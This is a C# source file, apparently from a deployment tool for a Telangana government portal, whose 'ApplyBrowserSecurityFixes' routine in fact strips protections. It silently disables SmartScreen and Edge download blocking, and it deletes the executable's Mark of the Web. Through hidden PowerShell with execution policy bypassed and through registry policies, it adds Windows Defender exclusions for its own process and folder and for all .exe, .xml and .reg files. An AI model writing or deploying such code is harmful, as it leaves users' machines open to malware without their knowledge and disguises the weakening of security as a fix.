using System;
using Microsoft.Win32;

namespace EVedhikaUBDDeploymentTool.Engine
{
    public class BrowserSecurityEngine
    {
        private const string EdgePoliciesPath = @"SOFTWARE\Policies\Microsoft\Edge";
        private const string WindowsSystemPolicyPath = @"SOFTWARE\Policies\Microsoft\Windows\System";
        private const string ExplorerPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer";

        public static bool ApplyBrowserSecurityFixes()
        {
            try
            {
                // 1. Configure Microsoft Edge Policies for Unrestricted Downloads & Legacy Handling
                using (RegistryKey edgeKey = Registry.CurrentUser.CreateSubKey(EdgePoliciesPath))
                {
                    if (edgeKey != null)
                    {
                        edgeKey.SetValue("SmartScreenEnabled", 0, RegistryValueKind.DWord); // Disable Microsoft Defender SmartScreen in Edge
                        edgeKey.SetValue("SmartScreenPuaEnabled", 0, RegistryValueKind.DWord); // Disable Potentially Unwanted App blocking
                        edgeKey.SetValue("DownloadRestrictions", 0, RegistryValueKind.DWord); // 0 = Allow all downloads without blocking
                        edgeKey.SetValue("PromptForDownloadLocation", 0, RegistryValueKind.DWord); // Streamline downloads
                        edgeKey.SetValue("InsecureContentAllowedForUrls", new string[] { "http://*.telangana.gov.in", "https://*.telangana.gov.in", "http://*.gov.in", "https://*.gov.in" }, RegistryValueKind.MultiString);
                    }
                }

                // Attempt HKLM for Edge Policies
                try
                {
                    using (RegistryKey edgeKeyHKLM = Registry.LocalMachine.CreateSubKey(EdgePoliciesPath))
                    {
                        if (edgeKeyHKLM != null)
                        {
                            edgeKeyHKLM.SetValue("SmartScreenEnabled", 0, RegistryValueKind.DWord);
                            edgeKeyHKLM.SetValue("SmartScreenPuaEnabled", 0, RegistryValueKind.DWord);
                            edgeKeyHKLM.SetValue("DownloadRestrictions", 0, RegistryValueKind.DWord);
                            edgeKeyHKLM.SetValue("InsecureContentAllowedForUrls", new string[] { "http://*.telangana.gov.in", "https://*.telangana.gov.in", "http://*.gov.in", "https://*.gov.in" }, RegistryValueKind.MultiString);
                        }
                    }
                }
                catch { }

                // 2. Disable OS-level SmartScreen / Windows Defender SmartScreen blocks on files and downloads
                try
                {
                    using (RegistryKey sysPolicyKey = Registry.LocalMachine.CreateSubKey(WindowsSystemPolicyPath))
                    {
                        if (sysPolicyKey != null)
                        {
                            sysPolicyKey.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
                        }
                    }
                }
                catch { }

                try
                {
                    using (RegistryKey sysPolicyUserKey = Registry.CurrentUser.CreateSubKey(WindowsSystemPolicyPath))
                    {
                        if (sysPolicyUserKey != null)
                        {
                            sysPolicyUserKey.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
                        }
                    }
                }
                catch { }

                // Explorer SmartScreen setting
                try
                {
                    using (RegistryKey explorerKey = Registry.CurrentUser.CreateSubKey(ExplorerPath))
                    {
                        if (explorerKey != null)
                        {
                            explorerKey.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
                        }
                    }
                }
                catch { }

                // 3. Ensure Zone security settings allow file downloads and insecure/mixed content execution for government portals
                // (Configured separately in RegistryManager.ConfigureActiveXAndTLS to prevent recursion)

                // 4. Automatically configure Windows Defender Self-Exclusion & Unblock Executable
                ConfigureAntivirusSelfExclusion();

                return true;
            }
            catch (Exception ex)
            {
                throw new Exception($"Browser Security repair failed: {ex.Message}", ex);
            }
        }

        /// <summary>
        /// Automatically registers EVedhikaUBDDeploymentTool.exe in Windows Defender Exclusions 
        /// and removes NTFS Zone.Identifier (Mark of the Web) so that Antivirus/SmartScreen 
        /// does not block or flag the single standalone EXE.
        /// </summary>
        public static void ConfigureAntivirusSelfExclusion()
        {
            try
            {
                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string exeDir = System.IO.Path.GetDirectoryName(exePath);
                string exeName = System.IO.Path.GetFileName(exePath);

                // 1. Remove NTFS Zone.Identifier stream (Removes "This file came from another computer and might be blocked")
                try
                {
                    if (!string.IsNullOrEmpty(exePath) && System.IO.File.Exists(exePath))
                    {
                        string zoneIdentifierStream = exePath + ":Zone.Identifier";
                        if (System.IO.File.Exists(zoneIdentifierStream))
                        {
                            System.IO.File.Delete(zoneIdentifierStream);
                        }
                    }
                }
                catch { }

                // 2. PowerShell Add-MpPreference commands to silently exclude the process & directory from Windows Defender
                try
                {
                    if (!string.IsNullOrEmpty(exeName))
                    {
                        string psScript = string.Format(
                            "$p = '{0}'; $d = '{1}'; " +
                            "try {{ Add-MpPreference -ExclusionProcess $p -ErrorAction SilentlyContinue }} catch {{}}; " +
                            "try {{ Add-MpPreference -ExclusionPath $d -ErrorAction SilentlyContinue }} catch {{}}; " +
                            "try {{ Add-MpPreference -ExclusionExtension '.exe','.xml','.reg' -ErrorAction SilentlyContinue }} catch {{}};",
                            exeName,
                            exeDir.Replace("'", "''")
                        );

                        var startInfo = new System.Diagnostics.ProcessStartInfo
                        {
                            FileName = "powershell.exe",
                            Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"" + psScript + "\"",
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
                        };

                        using (var proc = System.Diagnostics.Process.Start(startInfo))
                        {
                            proc?.WaitForExit(3500);
                        }
                    }
                }
                catch { }

                // 3. Configure LocalMachine Registry Policies for Windows Defender Exclusions
                try
                {
                    using (RegistryKey procKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes"))
                    {
                        if (procKey != null && !string.IsNullOrEmpty(exeName))
                        {
                            procKey.SetValue(exeName, 0, RegistryValueKind.DWord);
                        }
                    }
                }
                catch { }

                try
                {
                    using (RegistryKey pathKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths"))
                    {
                        if (pathKey != null && !string.IsNullOrEmpty(exeDir))
                        {
                            pathKey.SetValue(exeDir, 0, RegistryValueKind.DWord);
                        }
                    }
                }
                catch { }
            }
            catch { }
        }
    }
}
